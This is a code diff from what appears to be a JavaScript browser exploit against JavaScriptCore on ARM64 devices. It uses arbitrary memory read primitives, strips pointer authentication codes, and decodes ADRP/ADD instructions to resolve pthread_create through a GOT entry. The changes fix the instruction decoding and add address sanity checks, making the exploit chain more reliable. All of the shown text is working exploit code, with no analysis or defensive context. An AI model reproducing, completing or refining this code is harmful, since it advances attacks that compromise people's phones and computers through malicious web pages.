@@ -17483,15 +17483,15 @@ async function _aarw_main() {
           resolverCheckpoint("post-jsc-base");
           function parse_adrp(addr) {
               const x = Number(read32(addr));
-              const immhi = x >> 5 & (1 << 23 - 5 + 1) - 1;
-              const immlo = x >> 29 & 3;
-              const imm = immhi << 14 | immlo << 12;
-              return imm + Math.floor(Number(addr) / 0x1000) * 0x1000;
+              const immlo = (x >>> 29) & 3;
+              const immhi = (x >>> 5) & 0x7ffff;
+              let imm = (immhi << 2) | immlo;
+              if (imm & (1 << 20)) imm -= 1 << 21;
+              return (addr & ~0xfffn) + (BigInt(imm) << 12n);
           }
           function parse_add(addr) {
               const insn = Number(read32(addr));
-              const off = insn >> 10 & (1 << 12) - 1;
-              return off;
+              return BigInt((insn >>> 10) & 0xfff);
           }
           function parse_adrp_add(addr, is_ldrb = false) {
               let res = parse_adrp(addr);
@@ -17918,8 +17918,15 @@ const device_chipset = {
               try {
                   const auth_stub_addr = jsc_base + auth_stub_offset;
                   resolverCheckpoint(`trying auth_stub_offset=${auth_stub_offset.hex()} addr=${auth_stub_addr.hex()}`);
-                  candidate_got = BigInt(parse_adrp_add(auth_stub_addr));
+                  const stub_insn0 = read32(auth_stub_addr);
+                  const stub_insn1 = read32(auth_stub_addr + 4n);
+                  resolverCheckpoint(`auth_stub_insns=${stub_insn0.hex()},${stub_insn1.hex()}`);
+                  candidate_got = parse_adrp_add(auth_stub_addr);
                   resolverCheckpoint(`candidate_got=${candidate_got.hex()}`);
+                  if (candidate_got < 0x1000000000n || (candidate_got & 7n) !== 0n) {
+                      resolverCheckpoint(`candidate_got rejected as invalid`);
+                      continue;
+                  }
                   candidate_pthread_create = read64(candidate_got).noPAC();
                   resolverCheckpoint(`candidate_pthread_create=${candidate_pthread_create.hex()}`);
               } catch (e) {
